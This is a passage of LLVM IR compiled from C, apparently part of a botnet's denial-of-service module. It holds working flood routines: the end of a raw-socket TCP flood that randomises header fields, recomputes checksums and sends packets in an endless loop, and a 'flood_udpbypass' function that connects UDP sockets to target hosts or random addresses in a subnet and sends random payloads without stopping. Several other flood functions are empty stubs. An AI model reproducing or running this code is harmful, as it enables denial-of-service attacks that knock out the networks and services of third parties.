  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 0
  %512 = bitcast %union.anon* %511 to %struct.anon.0*
  %513 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %512, i32 0, i32 1
  store i16 %509, i16* %513, align 2
  br label %514

514:                                              ; preds = %506, %498
  %515 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %516 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %515, i32 0, i32 0
  %517 = bitcast %union.anon* %516 to %struct.anon.0*
  %518 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %517, i32 0, i32 0
  %519 = load i16, i16* %518, align 4
  %520 = zext i16 %519 to i32
  %521 = icmp eq i32 %520, 65535
  br i1 %521, label %522, label %530

522:                                              ; preds = %514
  %523 = call i32 @rand_new()
  %524 = and i32 %523, 65535
  %525 = trunc i32 %524 to i16
  %526 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %527 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %526, i32 0, i32 0
  %528 = bitcast %union.anon* %527 to %struct.anon.0*
  %529 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %528, i32 0, i32 0
  store i16 %525, i16* %529, align 4
  br label %530

530:                                              ; preds = %522, %514
  %531 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %532 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %531, i32 0, i32 0
  %533 = bitcast %union.anon* %532 to %struct.anon.0*
  %534 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %533, i32 0, i32 2
  %535 = load i32, i32* %534, align 4
  %536 = icmp eq i32 %535, 65535
  br i1 %536, label %537, label %544

537:                                              ; preds = %530
  %538 = call i32 @rand_new()
  %539 = and i32 %538, 65535
  %540 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %541 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %540, i32 0, i32 0
  %542 = bitcast %union.anon* %541 to %struct.anon.0*
  %543 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %542, i32 0, i32 2
  store i32 %539, i32* %543, align 4
  br label %544

544:                                              ; preds = %537, %530
  %545 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %546 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %545, i32 0, i32 0
  %547 = bitcast %union.anon* %546 to %struct.anon.0*
  %548 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %547, i32 0, i32 3
  %549 = load i32, i32* %548, align 4
  %550 = icmp eq i32 %549, 65535
  br i1 %550, label %551, label %558

551:                                              ; preds = %544
  %552 = call i32 @rand_new()
  %553 = and i32 %552, 65535
  %554 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 0
  %556 = bitcast %union.anon* %555 to %struct.anon.0*
  %557 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %556, i32 0, i32 3
  store i32 %553, i32* %557, align 4
  br label %558

558:                                              ; preds = %551, %544
  %559 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %560 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %559, i32 0, i32 7
  store i16 0, i16* %560, align 2
  %561 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %562 = bitcast %struct.iphdr* %561 to i16*
  %563 = call zeroext i16 @ip_header_checksum(i16* %562, i32 20)
  %564 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %565 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %564, i32 0, i32 7
  store i16 %563, i16* %565, align 2
  %566 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %567 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %566, i32 0, i32 0
  %568 = bitcast %union.anon* %567 to %struct.anon.0*
  %569 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %568, i32 0, i32 6
  store i16 0, i16* %569, align 4
  %570 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %571 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %572 = bitcast %struct.tcphdr* %571 to i8*
  %573 = load i16, i16* %5, align 2
  %574 = zext i16 %573 to i64
  %575 = add i64 20, %574
  %576 = trunc i64 %575 to i16
  %577 = call zeroext i16 @htons(i16 zeroext %576) #7
  %578 = load i16, i16* %5, align 2
  %579 = zext i16 %578 to i64
  %580 = add i64 20, %579
  %581 = trunc i64 %580 to i32
  %582 = call zeroext i16 @tcp_udp_header_checksum(%struct.iphdr* %570, i8* %572, i16 zeroext %577, i32 %581)
  %583 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %584 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %583, i32 0, i32 0
  %585 = bitcast %union.anon* %584 to %struct.anon.0*
  %586 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %585, i32 0, i32 6
  store i16 %582, i16* %586, align 4
  %587 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 0
  store i16 2, i16* %587, align 4
  %588 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %589 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %588, i32 0, i32 0
  %590 = bitcast %union.anon* %589 to %struct.anon.0*
  %591 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %590, i32 0, i32 1
  %592 = load i16, i16* %591, align 2
  %593 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 1
  store i16 %592, i16* %593, align 2
  %594 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %595 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %594, i32 0, i32 9
  %596 = load i32, i32* %595, align 4
  %597 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 2
  %598 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %597, i32 0, i32 0
  store i32 %596, i32* %598, align 4
  %599 = load i32*, i32** %22, align 8
  %600 = load i32, i32* %3, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds i32, i32* %599, i64 %601
  %603 = load i32, i32* %602, align 4
  %604 = load i8**, i8*** %9, align 8
  %605 = load i32, i32* %3, align 4
  %606 = sext i32 %605 to i64
  %607 = getelementptr inbounds i8*, i8** %604, i64 %606
  %608 = load i8*, i8** %607, align 8
  %609 = load i16, i16* %5, align 2
  %610 = zext i16 %609 to i64
  %611 = add i64 40, %610
  %612 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %613 = bitcast %struct.sockaddr_in* %29 to %struct.sockaddr*
  store %struct.sockaddr* %613, %struct.sockaddr** %612, align 8
  %614 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %615 = load %struct.sockaddr*, %struct.sockaddr** %614, align 8
  %616 = call i64 @sendto(i32 %603, i8* %608, i64 %611, i32 16384, %struct.sockaddr* %615, i32 16)
  br label %617

617:                                              ; preds = %558
  %618 = load i32, i32* %3, align 4
  %619 = add nsw i32 %618, 1
  store i32 %619, i32* %3, align 4
  br label %430, !llvm.loop !16

620:                                              ; preds = %430
  br label %429
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @flood_tcp_ack_connect(%struct.arguments* %0) #0 {
  %2 = alloca %struct.arguments*, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @flood_get(%struct.arguments* %0) #0 {
  %2 = alloca %struct.arguments*, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @flood_post(%struct.arguments* %0) #0 {
  %2 = alloca %struct.arguments*, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @flood_junk(%struct.arguments* %0) #0 {
  %2 = alloca %struct.arguments*, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  ret void
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @flood_udpbypass(%struct.arguments* %0) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i16, align 2
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %12 = alloca i32, align 4
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i16 0, i16* %3, align 2
  store i16 0, i16* %4, align 2
  store i32 0, i32* %5, align 4
  %13 = load %struct.arguments*, %struct.arguments** %2, align 8
  %14 = getelementptr inbounds %struct.arguments, %struct.arguments* %13, i32 0, i32 3
  %15 = load i8, i8* %14, align 1
  %16 = zext i8 %15 to i64
  %17 = call noalias align 16 i8* @calloc(i64 %16, i64 4) #8
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %7, align 8
  %19 = load i32*, i32** %7, align 8
  %20 = icmp ne i32* %19, null
  br i1 %20, label %22, label %21

21:                                               ; preds = %1
  call void @exit(i32 1) #9
  unreachable

22:                                               ; preds = %1
  store i32 0, i32* %5, align 4
  br label %23

23:                                               ; preds = %131, %22
  %24 = load i32, i32* %5, align 4
  %25 = load %struct.arguments*, %struct.arguments** %2, align 8
  %26 = getelementptr inbounds %struct.arguments, %struct.arguments* %25, i32 0, i32 3
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp slt i32 %24, %28
  br i1 %29, label %30, label %134

30:                                               ; preds = %23
  %31 = load %struct.arguments*, %struct.arguments** %2, align 8
  %32 = getelementptr inbounds %struct.arguments, %struct.arguments* %31, i32 0, i32 1
  %33 = load %struct.option*, %struct.option** %32, align 8
  %34 = load %struct.arguments*, %struct.arguments** %2, align 8
  %35 = getelementptr inbounds %struct.arguments, %struct.arguments* %34, i32 0, i32 2
  %36 = load i8, i8* %35, align 8
  %37 = call i32 @rand() #8
  %38 = srem i32 %37, 65482
  %39 = add nsw i32 53, %38
  %40 = trunc i32 %39 to i16
  %41 = call zeroext i16 @retrieve_opt_num(%struct.option* %33, i8 zeroext %36, i8 zeroext 1, i16 zeroext %40)
  store i16 %41, i16* %4, align 2
  %42 = call i32 @socket(i32 2, i32 2, i32 0) #8
  %43 = load i32*, i32** %7, align 8
  %44 = load i32, i32* %5, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds i32, i32* %43, i64 %45
  store i32 %42, i32* %46, align 4
  %47 = load i32*, i32** %7, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i32, i32* %47, i64 %49
  %51 = load i32, i32* %50, align 4
  %52 = icmp eq i32 %51, -1
  br i1 %52, label %53, label %54

53:                                               ; preds = %30
  call void @exit(i32 1) #9
  unreachable

54:                                               ; preds = %30
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %55, align 4
  %56 = call i32 @rand_new()
  %57 = trunc i32 %56 to i16
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %57, i16* %58, align 2
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %60 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %59, i32 0, i32 0
  store i32 0, i32* %60, align 4
  %61 = load i32*, i32** %7, align 8
  %62 = load i32, i32* %5, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i32, i32* %61, i64 %63
  %65 = load i32, i32* %64, align 4
  %66 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %67 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  store %struct.sockaddr* %67, %struct.sockaddr** %66, align 8
  %68 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %69 = load %struct.sockaddr*, %struct.sockaddr** %68, align 8
  %70 = call i32 @bind(i32 %65, %struct.sockaddr* %69, i32 16) #8
  %71 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %71, align 4
  %72 = load i16, i16* %4, align 2
  %73 = call zeroext i16 @htons(i16 zeroext %72) #7
  %74 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %73, i16* %74, align 2
  %75 = load %struct.arguments*, %struct.arguments** %2, align 8
  %76 = getelementptr inbounds %struct.arguments, %struct.arguments* %75, i32 0, i32 0
  %77 = load %struct.target*, %struct.target** %76, align 8
  %78 = load i32, i32* %5, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds %struct.target, %struct.target* %77, i64 %79
  %81 = getelementptr inbounds %struct.target, %struct.target* %80, i32 0, i32 1
  %82 = load i16, i16* %81, align 4
  %83 = zext i16 %82 to i32
  %84 = icmp slt i32 %83, 32
  br i1 %84, label %85, label %108

85:                                               ; preds = %54
  %86 = load %struct.arguments*, %struct.arguments** %2, align 8
  %87 = getelementptr inbounds %struct.arguments, %struct.arguments* %86, i32 0, i32 0
  %88 = load %struct.target*, %struct.target** %87, align 8
  %89 = load i32, i32* %5, align 4
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds %struct.target, %struct.target* %88, i64 %90
  %92 = getelementptr inbounds %struct.target, %struct.target* %91, i32 0, i32 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @ntohl(i32 %93) #7
  %95 = call i32 @rand_new()
  %96 = load %struct.arguments*, %struct.arguments** %2, align 8
  %97 = getelementptr inbounds %struct.arguments, %struct.arguments* %96, i32 0, i32 0
  %98 = load %struct.target*, %struct.target** %97, align 8
  %99 = load i32, i32* %5, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.target, %struct.target* %98, i64 %100
  %102 = getelementptr inbounds %struct.target, %struct.target* %101, i32 0, i32 1
  %103 = load i16, i16* %102, align 4
  %104 = zext i16 %103 to i32
  %105 = lshr i32 %95, %104
  %106 = add i32 %94, %105
  %107 = call i32 @htonl(i32 %106) #7
  br label %117

108:                                              ; preds = %54
  %109 = load %struct.arguments*, %struct.arguments** %2, align 8
  %110 = getelementptr inbounds %struct.arguments, %struct.arguments* %109, i32 0, i32 0
  %111 = load %struct.target*, %struct.target** %110, align 8
  %112 = load i32, i32* %5, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.target, %struct.target* %111, i64 %113
  %115 = getelementptr inbounds %struct.target, %struct.target* %114, i32 0, i32 0
  %116 = load i32, i32* %115, align 4
  br label %117

117:                                              ; preds = %108, %85
  %118 = phi i32 [ %107, %85 ], [ %116, %108 ]
  %119 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %120 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %119, i32 0, i32 0
  store i32 %118, i32* %120, align 4
  %121 = load i32*, i32** %7, align 8
  %122 = load i32, i32* %5, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds i32, i32* %121, i64 %123
  %125 = load i32, i32* %124, align 4
  %126 = bitcast %union.__CONST_SOCKADDR_ARG* %11 to %struct.sockaddr**
  %127 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  store %struct.sockaddr* %127, %struct.sockaddr** %126, align 8
  %128 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %11, i32 0, i32 0
  %129 = load %struct.sockaddr*, %struct.sockaddr** %128, align 8
  %130 = call i32 @connect(i32 %125, %struct.sockaddr* %129, i32 16)
  br label %131

131:                                              ; preds = %117
  %132 = load i32, i32* %5, align 4
  %133 = add nsw i32 %132, 1
  store i32 %133, i32* %5, align 4
  br label %23, !llvm.loop !17

134:                                              ; preds = %23
  store i32 0, i32* %12, align 4
  br label %135

135:                                              ; preds = %134, %180
  store i32 0, i32* %5, align 4
  br label %136

136:                                              ; preds = %177, %135
  %137 = load i32, i32* %5, align 4
  %138 = load %struct.arguments*, %struct.arguments** %2, align 8
  %139 = getelementptr inbounds %struct.arguments, %struct.arguments* %138, i32 0, i32 3
  %140 = load i8, i8* %139, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp slt i32 %137, %141
  br i1 %142, label %143, label %180

143:                                              ; preds = %136
  %144 = call i32 @rand() #8
  %145 = srem i32 %144, 436
  %146 = add nsw i32 1024, %145
  %147 = trunc i32 %146 to i16
  store i16 %147, i16* %3, align 2
  %148 = load i16, i16* %3, align 2
  %149 = zext i16 %148 to i64
  %150 = call noalias align 16 i8* @malloc(i64 %149) #8
  store i8* %150, i8** %6, align 8
  store i32 0, i32* %12, align 4
  br label %151

151:                                              ; preds = %164, %143
  %152 = load i32, i32* %12, align 4
  %153 = load i16, i16* %3, align 2
  %154 = zext i16 %153 to i32
  %155 = icmp slt i32 %152, %154
  br i1 %155, label %156, label %167

156:                                              ; preds = %151
  %157 = call i32 @rand() #8
  %158 = and i32 %157, 65535
  %159 = trunc i32 %158 to i8
  %160 = load i8*, i8** %6, align 8
  %161 = load i32, i32* %12, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8, i8* %160, i64 %162
  store i8 %159, i8* %163, align 1
  br label %164

164:                                              ; preds = %156
  %165 = load i32, i32* %12, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %12, align 4
  br label %151, !llvm.loop !18

167:                                              ; preds = %151
  %168 = load i32*, i32** %7, align 8
  %169 = load i32, i32* %5, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i32, i32* %168, i64 %170
  %172 = load i32, i32* %171, align 4
  %173 = load i8*, i8** %6, align 8
  %174 = load i16, i16* %3, align 2
  %175 = zext i16 %174 to i64
  %176 = call i64 @send(i32 %172, i8* %173, i64 %175, i32 16384)
  br label %177

177:                                              ; preds = %167
  %178 = load i32, i32* %5, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %5, align 4
  br label %136, !llvm.loop !19

180:                                              ; preds = %136
  br label %135
}

; Function Attrs: nounwind
declare i32 @rand() #5

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { argmemonly nofree nounwind willreturn writeonly }
attributes #4 = { argmemonly nofree nounwind willreturn }
attributes #5 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nounwind readnone willreturn }
attributes #8 = { nounwind }
attributes #9 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
